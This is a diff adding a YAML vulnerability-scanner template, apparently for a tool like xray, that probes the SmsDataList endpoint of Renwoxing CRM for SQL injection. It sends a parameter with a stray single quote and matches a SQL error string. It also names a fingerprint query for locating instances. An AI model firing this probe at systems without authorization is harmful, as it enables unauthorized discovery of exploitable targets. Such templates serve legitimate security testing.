@@ -1,0 +1,18 @@
+name: poc-yaml-crm-smsdatalist-sqli
+rules:
+    - method: POST
+      path: /SMS/SmsDataList/?pageIndex=1&pageSize=30
+      follow_redirects: false
+      headers:
+          Content-Type: application/x-www-form-urlencoded
+      body: >-
+        Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=00000000'
+      expression: |
+        response.status == 200 && response.body.bcontains(b'引号不完整')
+        
+detail:
+    author: crm-smsdatalist-sqli
+    links:
+        - 任我行 CRM SmsDataList
+        - app="任我行-CRM"
+
